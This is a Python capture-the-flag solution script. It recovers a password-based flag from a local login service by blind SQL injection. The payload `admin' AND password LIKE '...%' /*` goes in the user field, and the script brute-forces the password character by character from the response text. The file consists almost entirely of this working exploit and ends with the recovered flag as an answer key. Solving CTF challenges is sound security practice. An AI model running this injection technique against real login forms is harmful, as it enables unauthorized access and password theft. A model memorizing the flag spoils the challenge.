import requests
import urllib3
import string
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxyDict = {
    "http"  : 'http://127.0.0.1:8080',
    "https" : 'http://127.0.0.1:8080',
}

# Sample request:
#
# POST /fff5bf676ba8796f0c51033403b35311/login HTTP/1.1
# Host: 127.0.0.1:4446
# User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 19
# Origin: http://127.0.0.1:4446
# Connection: close
# Upgrade-Insecure-Requests: 1

# user=admin&pass=bar

password = 'UMASS{'
alphabet = string.digits + string.ascii_letters
while(not password.endswith('}')):
    print(password)

    found = False
    for ch in alphabet:
        new_password = password + ch
        r = requests.post('http://127.0.0.1:4446/fff5bf676ba8796f0c51033403b35311/login',
            data = {
                'user' : f"admin' AND password LIKE '{new_password}%' /*",
                'pass' : ""
            },
            proxies=proxyDict,
            verify=False,
            allow_redirects=False
        )
        assert(r.status_code == 200)
        if r.text == "If you're getting this you're not me. You'll never log in! ALSO I DIDNT HIDE ANYTHING IN MY PASSWORD SO DONT TRY!":
            password = new_password
            found = True
            break

    if found == False:
        password += '}'

print(password)

# password is the flag: UMASS{7h35u55y1mp0573rcr4ck57h3c0d3_}
